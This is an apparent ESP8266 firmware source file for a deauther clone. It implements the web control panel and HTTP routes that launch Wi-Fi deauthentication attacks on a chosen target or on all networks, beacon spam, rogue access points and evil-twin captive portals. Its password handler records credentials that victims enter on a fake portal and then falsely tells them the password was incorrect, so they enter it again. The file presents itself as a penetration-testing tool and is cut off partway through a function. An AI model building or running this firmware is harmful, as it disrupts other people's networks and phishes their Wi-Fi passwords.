#ifndef WEBSERVER_H
#define WEBSERVER_H

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <DNSServer.h>
#include <ESP8266HTTPUpdateServer.h>
#include "config.h"
#include "display.h"
#include "attacks.h"
#include "sniffer.h"
#include "espnow_ctrl.h"
#include "filesystem.h"
#include "localization.h"

// ============================================================
// TamsDeauth Clone - Web Server & All HTTP Routes
// Complete route table matching original firmware v3.8.1
// ============================================================

ESP8266WebServer server(80);
DNSServer dnsServer;
ESP8266HTTPUpdateServer httpUpdater;
bool captivePortalActive = false;
bool dnsServerActive = false;

// Forward declarations
void handleRoot();
void handleScan();
void handleCurrentTarget();
void handleWifiStatus();
void handleStartDeauth();
void handleStopDeauth();
void handlePauseDeauth();
void handleResumeDeauth();
void handleBeaconSpam();
void handleGetBeaconSSID();
void handleSniffer();
void handleMonitor();
void handleHtmlMenu();
void handleFsBrowser();
void handleDevMenu();
void handleSettings();
void handleReboot();
void handleVirtualDisplay();
void handleHowToUse();
void handleTextEditor();
void handleLanguageEditor();
void handleRouterGuard();
void handleEtwinPage(int num);
void handleRoguePage(int num);
void handleEtwinDefault();
void handleCaptiveDefault();
void handleVerifyDefault();
void handleVerifyPageDefault();
void handlePacketsCount();
void handlePasswordStatus();
void handleLog();
void handleConfigJson();
void handleGuardConfigJson();
void handleOtaProgress();
void handlePreview();
void handleLocalRemote();
void handleSetTime();
void handleFetch5ghz();
void handleStopAP();
void handleNotFound();
void handleWelcomePage();

// ---- Main page / root handler ----
void handleRoot() {
  // Check for various query parameters
  if (server.hasArg("scan")) {
    String scanType = server.arg("scan");
    if (scanType == "scan" || scanType == "customscan") {
      // Trigger WiFi scan
      // scanNetworks(scanType == "customscan");
      server.send(200, "text/html", "<script>setTimeout(function(){window.location.href='/';},2000);</script>Scanning...");
      return;
    }
  }
  
  if (server.hasArg("deauth")) {
    String action = server.arg("deauth");
    if (action == "start") { startDeauthAttack(); }
    else if (action == "stop") { stopDeauthAttack(); }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("deauthAll")) {
    String action = server.arg("deauthAll");
    if (action == "start") { startDeauthAllAttack(); }
    else if (action == "stop") { stopDeauthAllAttack(); }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("trueDeauth")) {
    String action = server.arg("trueDeauth");
    if (action == "start") { /* startTrueDeauth(); */ }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("preciseDeauth")) {
    String action = server.arg("preciseDeauth");
    if (action == "start") { /* startPreciseDeauth(); */ }
    else if (action == "stop") { /* stopPreciseDeauth(); */ }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("beaconSpam")) {
    String action = server.arg("beaconSpam");
    if (action == "start") { startBeaconSpam(); }
    else if (action == "randomize") { /* randomizeBeacons(); */ }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("sniffer")) {
    String action = server.arg("sniffer");
    if (action == "start") { startSniffer(SNIFF_STATION); }
    else if (action == "probe") { startSniffer(SNIFF_PROBE); }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("roguehotspot")) {
    String action = server.arg("roguehotspot");
    if (action == "start") { startRogueAP(); }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("deauthmon")) {
    String action = server.arg("deauthmon");
    if (action == "start") { startSniffer(SNIFF_DEAUTH); }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  if (server.hasArg("softAP")) {
    String action = server.arg("softAP");
    if (action == "hide") { /* hideSoftAP(); */ }
    else if (action == "unhide") { /* showSoftAP(); */ }
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  // ESPNOW_QC commands
  if (server.hasArg("ESPNOW_QC")) {
    String qcResponse = processEspNowQC(server.arg("ESPNOW_QC"));
    server.send(200, "text/plain", qcResponse);
    return;
  }
  
  // Router guard
  if (server.hasArg("router_guard")) {
    String action = server.arg("router_guard");
    if (action == "start") { /* startRouterGuard(); */ }
    server.send(200, "text/html", "<script>window.location.href='/routerguard';</script>");
    return;
  }
  
  // Evil-Twin template selection
  for (int i = 1; i <= 5; i++) {
    String key = "etwin" + String(i);
    if (server.hasArg(key)) {
      // Set etwin path
      // config.Etwin_Path = i;
      // saveConfig();
      server.send(200, "text/html", "<script>window.location.href='/';</script>");
      return;
    }
  }
  if (server.hasArg("etwin_default")) {
    // config.Etwin_Path = 0;
    server.send(200, "text/html", "<script>window.location.href='/';</script>");
    return;
  }
  
  // Rogue AP template selection
  for (int i = 1; i <= 5; i++) {
    String key = "rogue" + String(i);
    if (server.hasArg(key)) {
      // config.Rogue_Path = i;
      server.send(200, "text/html", "<script>window.location.href='/';</script>");
      return;
    }
  }
  
  // File assignment
  if (server.hasArg("file")) {
    String fileArg = server.arg("file");
    if (fileArg.startsWith("assign_")) {
      // Assign HTML file to template slot
      server.send(200, "text/html", "<script>window.location.href='/fsbrowser';</script>");
      return;
    }
  }
  
  // Beacon SSID submission
  if (server.hasArg("beaconssid")) {
    String ssids = server.arg("beaconssid");
    // Save to /beacons.txt
    writeFileContent("/beacons.txt", ssids);
    server.send(200, "text/html", "<script>window.location.href='/beaconspam';</script>");
    return;
  }
  
  // Pattern lock
  if (server.hasArg("newpattern")) {
    String pattern = server.arg("newpattern");
    // Save pattern lock
    server.send(200, "text/html", "<script>window.location.href='/settings';</script>");
    return;
  }
  
  // Captive page editor
  if (server.hasArg("page")) {
    String page = server.arg("page");
    if (page == "captive") {
      server.send(200, "text/html", "<script>window.location.href='/language_editor';</script>");
      return;
    }
  }
  
  // Admin page (welcome/notice)
  if (server.hasArg("adminpage")) {
    String action = server.arg("adminpage");
    if (action == "continue") {
      // Set flag that user accepted notice
      // showMainPage = true;
    }
  }
  
  // Settings form submission
  if (server.method() == HTTP_POST && !server.hasArg("upload")) {
    // Process settings form
    // Iterate through all config keys and update
    for (int i = 0; i < numConfigKeys; i++) {
      String key = configKeys[i];
      if (server.hasArg(key)) {
        setConfigString(key, server.arg(key));
      }
    }
    saveConfig();
    server.send(200, "text/html", "<script>window.location.href='/settings';</script>");
    return;
  }
  
  // Password capture from captive portal (evil-twin / rogue AP)
  if (server.hasArg("password")) {
    String pwd = server.arg("password");
    capturePassword(pwd);
    String html = "<!DOCTYPE html><html><head><title>Error</title>";
    html += "<style>body{font-family:Arial;text-align:center;padding:40px;}</style></head><body>";
    html += "<h2>%INCORRECT%</h2>";
    html += "<p>%REENTER2%</p>";
    html += "<form method='post' action='/?password=1'>";
    html += "<input type='password' name='password'><br><br>";
    html += "<input type='submit' value='%SUBMIT%'>";
    html += "</form></body></html>";
    html = localizeHTML(html, String(cfg.Language));
    server.send(200, "text/html", html);
    return;
  }
  
  // Default: serve main page from LittleFS or generate it
  if (fileExists("/index.html")) {
    serveFile("/index.html");
  } else {
    // Generate main page inline
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta charset='UTF-8'>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<title>TamsDeauth</title>";
    html += "<link rel='stylesheet' href='TamsDeauth.css'>";
    html += "</head><body>";
    
    // Menu section (collapsible)
    html += "<h1 id='menu-header' style='cursor: pointer;'>&nbspMenu</h1>";
    html += "<div id='menu-content' class='collapsible-content'>";
    html += "<form style='display:inline-block;' method='post' action='/?scan=scan'>";
    html += "<button style='display:inline-block;'>SCAN</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?scan=customscan'>";
    html += "<button style='display:inline-block;'>DEEP SCAN</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?sniffer=probe'>";
    html += "<button style='display:inline-block;'>REVEAL SSID</button></form>";
    html += "</div>";
    
    // Target section
    html += "<h1 id='target-header' style='cursor: pointer;'>Target</h1>";
    html += "<div id='target-content' class='collapsible-content'>";
    html += "<h1 id='' style='cursor: pointer;'>Target : <span id='targetText'>None</span></h1>";
    html += "<button style='display:inline-block;'>CLEAR SELECTION</button>";
    html += "</div>";
    
    // Attack buttons
    html += "<form style='display:inline-block;' method='post' action='/?deauth=start'>";
    html += "<button style='display:inline-block;'>START DEAUTH</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?deauth=stop'>";
    html += "<button style='display:inline-block;background-color:#c20e0e;color:white;'>STOP DEAUTH</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/?deauthAll=start'>";
    html += "<button style='display:inline-block;'>START DEAUTH ALL</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?deauthAll=stop'>";
    html += "<button style='display:inline-block;background-color:#c20e0e;color:white;'>STOP DEAUTH ALL</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/?preciseDeauth=start'>";
    html += "<button style='display:inline-block;'>START PRECISE DEAUTH</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?preciseDeauth=stop'>";
    html += "<button style='display:inline-block;background-color:#c20e0e;color:white;'>STOP PRECISE DEAUTH</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/?trueDeauth=start'>";
    html += "<button style='display:inline-block;'>START TRUE DEAUTH</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/beaconspam'>";
    html += "<button style='display:inline-block;'>BEACON SPAM</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/?roguehotspot=start'>";
    html += "<button style='display:inline-block;'>START ROGUE AP</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/routerguard'>";
    html += "<button style='display:inline-block;'>ROUTER GUARD</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/monitor'>";
    html += "<button style='display:inline-block;'>MONITOR</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/sniffer'>";
    html += "<button style='display:inline-block;'>OBSERVE STATIONS</button></form>";
    
    html += "<form style='display:inline-block;' method='post' action='/?deauthmon=start'>";
    html += "<button style='display:inline-block;'>DEAUTH MONITOR</button></form>";
    
    // ESP-NOW remote control
    html += "<form style='display:inline-block;' method='post' action='/?ESPNOW_QC=target_sync'>";
    html += "<button style='display:inline-block;'>SYNC TARGET</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauth_on'>";
    html += "<button>DEAUTH ON</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauth_off'>";
    html += "<button>DEAUTH OFF</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauthall_on'>";
    html += "<button>DEAUTHALL ON</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=deauthall_off'>";
    html += "<button>DEAUTHALL OFF</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=rogueap_start'>";
    html += "<button>ROGUE START</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=softap_hide'>";
    html += "<button>HIDE AP</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=softap_show'>";
    html += "<button>SHOW AP</button></form>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/?ESPNOW_QC=reboot'>";
    html += "<button>REBOOT</button></form>";
    
    // Utility links
    html += "<form style='display:inline-block;' method='post' action='/htmlmenu'>";
    html += "<button>HTML MENU</button></form>";
    html += "<form style='display:inline-block;' method='post' action='/settings'>";
    html += "<button>SETTINGS</button></form>";
    html += "<form style='display:inline-block;' method='post' action='/fsbrowser'>";
    html += "<button>FILE MANAGER</button></form>";
    html += "<form style='display:inline-block;' method='post' action='/virtualdisplay'>";
    html += "<button>VIRTUAL DISPLAY</button></form>";
    html += "<form style='display:inline-block;' method='post' action='/log'>";
    html += "<button>VIEW LOG</button></form>";
    html += "<form style='display:inline-block;' method='post' action='/reboot'>";
    html += "<button>RESTART</button></form>";
    
    html += "<br><br>";
    html += "<p style='font-size:0.9em;color:#888;'>TamsDeauth Clone | Inspired by WiFi deauther projects | ";
    html += "Developed from 's EvilTwin source</p>";
    html += "</body></html>";
    
    server.send(200, "text/html", html);
  }
}

// ---- Scan handler ----
void handleScan() {
  // Perform WiFi scan and return results
  int n = WiFi.scanNetworks();
  String html = "<!DOCTYPE html><html><head><title>SSID List</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>SSID List</h1>";
  html += "<table><tr style='horizontal-align:top'><th>SSID</th><th>BSSID</th><th>CH</th><th>SIGNAL</th><th>SELECT</th></tr>";
  
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    uint8_t* bssid = WiFi.BSSID(i);
    int ch = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    
    html += "<tr><td>" + ssid + "</td>";
    html += "<td>";
    for (int j = 0; j < 6; j++) {
      if (j > 0) html += ":";
      html += String(bssid[j], HEX);
    }
    html += "</td>";
    html += "<td>" + String(ch) + "</td>";
    html += "<td>" + String(rssi) + " dBm</td>";
    html += "<td><button>SELECT</button></td></tr>";
  }
  
  html += "</table><br>";
  html += "<form style='display:inline-block;' method='post' action='/?beaconSpam=randomize'>";
  html += "<button>RANDOMIZE BEACONS</button></form>";
  html += "<form style='display:inline-block;' method='post' action='/beaconspam'>";
  html += "<button>BEACON SPAM</button></form>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- Current target handler ----
void handleCurrentTarget() {
  String response = "Target: " + String(cfg.target_ssid) + " (";
  for (int i = 0; i < 6; i++) {
    if (i > 0) response += ":";
    response += String(cfg.target_bssid[i], HEX);
  }
  response += ") on channel " + String(cfg.target_ch);
  server.send(200, "text/plain", response);
}

// ---- WiFi status handler ----
void handleWifiStatus() {
  String json = "{";
  json += "\"status\":\"" + String(WiFi.status() == WL_CONNECTED ? "connected" : "disconnected") + "\",";
  json += "\"ssid\":\"" + String(WiFi.SSID()) + "\",";
  json += "\"ip\":\"" + WiFi.localIP().toString() + "\",";
  json += "\"ap_ssid\":\"" + String(cfg.AP_SSID) + "\",";
  json += "\"ap_ip\":\"" + WiFi.softAPIP().toString() + "\",";
  json += "\"clients\":" + String(WiFi.softAPgetStationNum());
  json += "}";
  server.send(200, "application/json", json);
}

// ---- Deauth control handlers ----
void handleStartDeauth() {
  startDeauthAttack();
  server.send(200, "text/plain", "DEAUTH ON");
}
void handleStopDeauth() {
  stopDeauthAttack();
  server.send(200, "text/plain", "DEAUTH OFF");
}
void handlePauseDeauth() {
  // pauseDeauth = true;
  server.send(200, "text/plain", "PAUSED");
}
void handleResumeDeauth() {
  // pauseDeauth = false;
  server.send(200, "text/plain", "RESUMED");
}

// ---- Beacon spam handlers ----
void handleBeaconSpam() {
  String html = "<!DOCTYPE html><html><head><title>BEACON SPAM</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1_glow>BEACON SPAM</h1_glow>";
  html += "<form method='post' action='/'><label for='beaconssid'>SSID List:</label><br>";
  html += "<textarea name='beaconssid' rows='5' cols='30' placeholder='SSID1\\nSSID2\\nSSID3'></textarea><br>";
  html += "<button type='submit'>SAVE BEACONS</button></form><br>";
  html += "<form style='display:inline-block;' method='post' action='/?beaconSpam=start'>";
  html += "<button>START SPAM</button></form>";
  html += "<form style='display:inline-block;' method='post' action='/'>";
  html += "<button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleGetBeaconSSID() {
  String beacons = readFileContent("/beacons.txt");
  if (beacons.length() == 0) {
    beacons = "Free Wifi|TamsDeauth|Test";
  }
  server.send(200, "text/plain", beacons);
}

// ---- Sniffer handler ----
void handleSniffer() {
  String html = "<!DOCTYPE html><html><head><title>Sniffer</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>Observe Stations</h1>";
  html += "<p>Target: " + String(cfg.target_ssid) + " on channel " + String(cfg.target_ch) + "</p>";
  html += "<form style='display:inline-block;' method='post' action='/?sniffer=start'>";
  html += "<button>COUNT STATIONS</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/monitor'>";
  html += "<button>MONITOR</button></form>";
  html += "<table><thead><tr><th>STATION BSSID</th><th>DATA PACKETS</th><th>SELECT</th><th>ACTION</th></tr></thead>";
  html += "<tbody id='guardListBody'>";
  html += getStationListHTML();
  html += "</tbody></table>";
  html += "<form style='display:inline-block;' method='post' action='/'>";
  html += "<button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- Monitor / Status handler ----
void handleMonitor() {
  String html = "<!DOCTYPE html><html><head><title>Status Monitor</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>Status Monitor</h1>";
  html += "<p><span class='a'>Current target</span> <span class='b'>:</span> <span class='c'>" + String(cfg.target_ssid) + "</span></p>";
  html += "<p><span class='a'>Current target BSSID</span> <span class='b'>:</span> <span class='c'>";
  for (int i = 0; i < 6; i++) { if (i > 0) html += ":"; html += String(cfg.target_bssid[i], HEX); }
  html += "</span></p>";
  html += "<p><span class='a'>Current target channel</span> <span class='b'>:</span> <span class='c'>" + String(cfg.target_ch) + "</span></p>";
  html += "<p><span class='a'>Deauth</span> <span class='b'>:</span> <span class='c'>" + String(deauthActive ? "ACTIVE" : "OFF") + "</span></p>";
  html += "<p><span class='a'>Deauth All</span> <span class='b'>:</span> <span class='c'>" + String(deauthAllActive ? "ACTIVE" : "OFF") + "</span></p>";
  html += "<p><span class='a'>Evil-Twin</span> <span class='b'>:</span> <span class='c'>" + String(evilTwinActive ? "ACTIVE" : "OFF") + "</span></p>";
  html += "<p><span class='a'>Rogue AP</span> <span class='b'>:</span> <span class='c'>" + String(rogueAPActive ? "ACTIVE" : "OFF") + "</span></p>";
  html += "<p><span class='a'>AP(s) scanned</span> <span class='b'>:</span> <span class='c'>" + String(scanResultCount) + "</span></p>";
  html += "<p><span class='a'>Client(s) seen</span> <span class='b'>:</span> <span class='c'>" + String(stationCount) + "</span></p>";
  html += "<p><span class='a'>Client(s) connected</span> <span class='b'>:</span> <span class='c'>" + String(WiFi.softAPgetStationNum()) + "</span></p>";
  html += "<p><span class='a'>Password(s) submitted</span> <span class='b'>:</span> <span class='c'>" + String(passwordsCaptured) + "</span></p>";
  html += "<form style='display:inline-block;' method='post' action='/pause_deauth'>";
  html += "<button>PAUSE ATTACK</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/resume_deauth'>";
  html += "<button>RESUME ATTACK</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/htmlmenu'>";
  html += "<button>HTML MENU</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- HTML Menu handler ----
void handleHtmlMenu() {
  String html = "<!DOCTYPE html><html><head><title>HTML Menu</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'>";
  html += "<script src='collapsible.js'></script></head><body>";
  html += "<h1 id='menu-header' style='cursor: pointer;'>&nbspMenu</h1>";
  html += "<div id='menu-content'>";
  html += "<form style='display:inline-block;' method='post' action='/?scan=scan'><button>SCAN</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/beaconspam'><button>BEACON SPAM</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/routerguard'><button>ROUTER GUARD</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/sniffer'><button>OBSERVE STATIONS</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/monitor'><button>MONITOR</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/settings'><button>SETTINGS</button></form>";
  html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/fsbrowser'><button>FILE MANAGER</button></form>";
  html += "</div>";
  html += "<br><form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- Settings handler ----
void handleSettings() {
  String html = "<!DOCTYPE html><html><head><title>Settings</title>";
  html += "<link rel='stylesheet' href='settings.css'></head><body>";
  html += "<form method='post' action='/'>";
  
  html += "<h1>Display</h1>";
  html += "<label for='displaytimeout'>Display Sleep (ms):</label>";
  html += "<input type='number' id='displaytimeout' name='OLED_Timeout' value='" + String(cfg.OLED_Timeout) + "'><br>";
  html += "<label for='oled_interval'>Stream Interval (ms):</label>";
  html += "<input type='number' id='oled_interval' name='OLED_Interval' value='" + String(cfg.OLED_Interval) + "'><br>";
  
  html += "<h1>Access Point</h1>";
  html += "<label for='apname'>AP SSID:</label><br>";
  html += "<input type='text' id='apname' name='AP_SSID' value='" + String(cfg.AP_SSID) + "'><br>";
  html += "<label for='appassword'>AP Password:</label><br>";
  html += "<input type='text' id='appassword' name='AP_Password' value='" + String(cfg.AP_Password) + "' minlength='8'><br>";
  html += "<label for='roguehotspotname'>Rogue AP SSID:</label><br>";
  html += "<input type='text' id='roguehotspotname' name='Rogue_SSID' value='" + String(cfg.Rogue_SSID) + "'><br>";
  
  html += "<h1>Extender</h1>";
  html += "<label for='extender_SSID'>Extender SSID:</label><br>";
  html += "<input type='text' id='extender_SSID' name='Extender_SSID' value='" + String(cfg.Extender_SSID) + "'><br>";
  html += "<label for='extender_password'>Extender Password:</label><br>";
  html += "<input type='text' id='extender_password' name='Extender_Password' value='" + String(cfg.Extender_Password) + "'><br>";
  
  html += "<h1>Auto Deep-Sleep</h1>";
  html += "<label><input type='checkbox' name='Powersave_Active' value='1' " + String(cfg.Powersave_Active ? "checked" : "") + "> Enable Power Save</label><br>";
  
  html += "<h1>Auto Resume</h1>";
  html += "<label><input type='checkbox' name='Resume_Active' value='1' " + String(cfg.Resume_Active ? "checked" : "") + "> Resume attack after power loss</label><br>";
  
  html += "<h1>LED Blink</h1>";
  html += "<label><input type='checkbox' name='LED_Active' value='1' " + String(cfg.LED_Active ? "checked" : "") + "> Enable LED indicator</label><br>";
  
  html += "<h1>Pattern Lock Screen</h1>";
  html += "<label><input type='checkbox' name='Pattern_Lock' value='1' " + String(cfg.Pattern_Lock[0] ? "checked" : "") + "> Enable Pattern Lock</label><br>";
  
  html += "<h1>Scan</h1>";
  html += "<label for='scanduration'>Scan Duration (ms):</label>";
  html += "<input type='number' id='scanduration' name='scanduration' value='" + String(cfg.scanduration) + "'><br>";
  html += "<label for='deauthDelay'>Deauth Delay (ms):</label>";
  html += "<input type='number' id='deauthDelay' name='deauthDelay' value='" + String(cfg.deauthDelay) + "'><br>";
  
  html += "<h1>Language</h1>";
  html += "<label><input type='radio' name='Language' value='en' " + String(String(cfg.Language) == "en" ? "checked" : "") + "> English</label>";
  html += "<label><input type='radio' name='Language' value='id' " + String(String(cfg.Language) == "id" ? "checked" : "") + "> Bahasa Indonesia</label><br>";
  
  html += "<br><button type='submit'>SAVE SETTINGS</button>";
  html += "</form>";
  html += "<br><form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// ---- Virtual Display handler ----
void handleVirtualDisplay() {
  // Virtual display framebuffer request (binary 1024 bytes)
  if (server.hasArg("frame")) {
    captureOledBuffer();
    server.send(200, "application/octet-stream",
                (const char*)oledBuffer, OLED_BUFFER_SIZE);
    return;
  }
  // Virtual button press from web interface
  if (server.hasArg("btn")) {
    virtualButton = (int8_t)server.arg("btn").toInt();
    server.send(200, "text/plain", "OK");
    return;
  }
  if (fileExists("/virtualdisplay.html")) {
    serveFile("/virtualdisplay.html");
  } else {
    String html = "<!DOCTYPE html><html><head>";
    html += "<title>VIRTUAL DISPLAY</title>";
    html += "<style>";
    html += "@font-face { font-family: 'CustomFont'; src: url('/font.woff2') format('woff2'); }";
    html += "body { background: #1a1a2e; color: #7db5ff; text-align: center; font-family: 'Helvetica Neue', Arial, sans-serif; }";
    html += "h1 { font-size: 2rem; font-weight: 100; text-shadow: 0 0 5px #00b4ff, 0 0 10px #00b4ff; -webkit-text-stroke: 1px #7db5ff; }";
    html += "canvas { image-rendering: pixelated; border: 2px solid #333; background: #000; }";
    html += "button { display: inline-block; background: #0e5cc2; color: white; border: none; padding: 10px 15px; ";
    html += "text-align: center; font-size: 11px; font-weight: 600; text-transform: uppercase; ";
    html += "text-decoration: none; cursor: pointer; border-radius: 3px; }";
    html += "#controls { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; max-width: 200px; margin: 10px auto; }";
    html += ".log-entry { margin: 0; padding: 2px 5px; border-bottom: 1px solid #444; font-size: 0.9em; }";
    html += "</style></head><body>";
    html += "<h1>VIRTUAL DISPLAY</h1>";
    html += "<form style='display:inline-block; padding-left:8px;' method='post' action='/'><button>BACK</button></form>";
    html += "<p>FPS: <span id='fps-counter'>--</span> | Interval: <span id='interval-display'>--</span>ms | Latency: <span id='latency-display'>--</span>ms</p>";
    html += "<canvas id='oled-display' width='128' height='64'></canvas>";
    html += "<div id='controls'>";
    html += "<div></div><button id='btn-up' onclick='sendButtonCommand(\"1\")'>&#9650;</button><div></div>";
    html += "<button id='btn-left' onclick='sendButtonCommand(\"4\")'>&#9664;</button>";
    html += "<button id='btn-confirm' onclick='sendButtonCommand(\"5\")'>OK</button>";
    html += "<button id='btn-right' onclick='sendButtonCommand(\"2\")'>&#9658;</button>";
    html += "<div></div><button id='btn-down' onclick='sendButtonCommand(\"3\")'>&#9660;</button><div></div>";
    html += "</div>";
    html += "<div id='log' style='text-align:left;max-height:100px;overflow-y:auto;border:1px solid #444;padding:5px;'></div>";
    html += "<script>";
    html += "const canvas = document.getElementById('oled-display');";
    html += "const ctx = canvas.getContext('2d');";
    html += "const fpsCounter = document.getElementById('fps-counter');";
    html += "const intervalDisplay = document.getElementById('interval-display');";
    html += "const latencyDisplay = document.getElementById('latency-display');";
    html += "const logDiv = document.getElementById('log');";
    html += "let frameCount = 0;";
    html += "let lastFpsTime = Date.now();";
    html += "let currentInterval = 100;";
    html += "let latencySum = 0;";
    html += "let latencyCount = 0;";
    html += "function logMessage(message) {";
    html += "  const p = document.createElement('p');";
    html += "  p.className = 'log-entry';";
    html += "  p.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message;";
    html += "  logDiv.appendChild(p);";
    html += "  logDiv.scrollTop = logDiv.scrollHeight;";
    html += "}";
    html += "function sendButtonCommand(command) {";
    html += "  fetch('/virtualdisplay?btn=' + command, { method: 'POST' });";
    html += "}";
    html += "function drawBuffer(buffer) {";
    html += "  const imageData = ctx.createImageData(128, 64);";
    html += "  for (let i = 0; i < 1024; i++) {";
    html += "    for (let bit = 0; bit < 8; bit++) {";
    html += "      const pixelIndex = (i * 8 + bit) * 4;";
    html += "      const y = Math.floor((i * 8 + bit) / 128);";
    html += "      const x = (i * 8 + bit) % 128;";
    html += "      if (y >= 64) continue;";
    html += "      const pixelOn = (buffer[i] >> bit) & 1;";
    html += "      imageData.data[pixelIndex] = pixelOn ? 0 : 26;";
    html += "      imageData.data[pixelIndex+1] = pixelOn ? 180 : 26;";
    html += "      imageData.data[pixelIndex+2] = pixelOn ? 255 : 46;";
    html += "      imageData.data[pixelIndex+3] = 255;";
    html += "    }";
    html += "  }";
    html += "  ctx.putImageData(imageData, 0, 0);";
    html += "}";
    html += "async function requestFrame() {";
    html += "  const startTime = performance.now();";
    html += "  try {";
    html += "    const response = await fetch('/virtualdisplay?frame=1');";
    html += "    if (response.ok) {";
    html += "      const buffer = new Uint8Array(await response.arrayBuffer());";
    html += "      if (buffer.length === 1024) { drawBuffer(buffer); }";
    html += "      latencySum += performance.now() - startTime;";
    html += "      latencyCount++;";
    html += "    }";
    html += "  } catch(e) { logMessage('Error: ' + e.message); }";
    html += "  frameCount++;";
    html += "  const now = Date.now();";
    html += "  if (now - lastFpsTime >= 1000) {";
    html += "    const fps = Math.round(frameCount * 1000 / (now - lastFpsTime));";
    html += "    fpsCounter.textContent = fps;";
    html += "    intervalDisplay.textContent = currentInterval.toFixed(0);";
    html += "    if (latencyCount > 0) latencyDisplay.textContent = (latencySum / latencyCount).toFixed(1);";
    html += "    frameCount = 0; lastFpsTime = now; latencySum = 0; latencyCount = 0;";
    html += "  }";
    html += "}";
    html += "function frameLoop() { requestFrame().then(() => setTimeout(frameLoop, currentInterval)); }";
    html += "frameLoop();";
    html += "logMessage('Virtual display connected');";
    html += "</script></body></html>";
    server.send(200, "text/html", html);
  }
}

// ---- Other handlers ----
void handleReboot() {
  server.send(200, "text/html", "<script>setTimeout(function(){window.location.href='/';},3000);</script>Rebooting...");
  delay(1000);
  ESP.restart();
}

void handleHowToUse() {
  String html = "<!DOCTYPE html><html><head><title>How To Use</title>";
  html += "<link rel='stylesheet' href='TamsDeauth.css'></head><body>";
  html += "<h1>How To Use</h1>";
  html += "<p>Welcome to TamsDeauth !</p>";
  html += "<p>This project is WiFi security testing tool and built from scratch.</p>";
  html += "<p>The goal is to demonstrate how Wi-Fi penetration testing is performed.</p>";
  html += "<p>Connect to TamsDeauth WiFi AP, open browser to 192.168.4.1</p>";
  html += "<p>Use the web interface or OLED display + buttons to control the device.</p>";
  html += "<form style='display:inline-block;' method='post' action='/'><button>BACK</button></form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleTextEditor() {
  String filename = "/";
  if (server.hasArg("file")) filename += server.arg("file");
  server.send(200, "text/html", getTextEditorHTML(filename));
}

void handleLanguageEditor() {
